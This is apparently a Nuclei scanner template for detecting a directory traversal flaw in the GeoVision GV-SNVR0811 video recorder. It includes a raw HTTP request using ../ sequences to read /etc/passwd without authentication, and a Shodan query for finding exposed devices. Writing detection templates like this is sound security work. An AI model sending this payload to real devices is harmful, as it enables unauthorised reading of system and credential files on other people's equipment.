http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "root:$")
    - contains(content_type, "application/octet-stream")
    type: dsl
  raw:
  - 'GET /../../../../../../../../../../etc/passwd HTTP/1.1

    Host: {{Hostname}}

    '
id: geovision-lfi
info:
  author: DhiyaneshDK
  description: 'The GeoVision GV-SNVR0811 network video recorder is vulnerable to
    a Directory Traversal vulnerability, which allows unauthenticated remote attackers
    to access arbitrary files on the device by manipulating the file path in HTTP
    requests (e.g., using ../ sequences).

    '
  impact: This could lead to unauthorized access to sensitive files, including system
    configurations, credentials, or other critical information.
  metadata:
    max-request: 1
    shodan-query: Server:Cross Web Server
    verified: true
  name: GeoVision GV-SNVR0811 - Directory Traversal
  reference:
  - https://www.exploit-db.com/exploits/45065
  severity: high
  tags: geovision,lfi,cross-web,webclient,iot,vuln
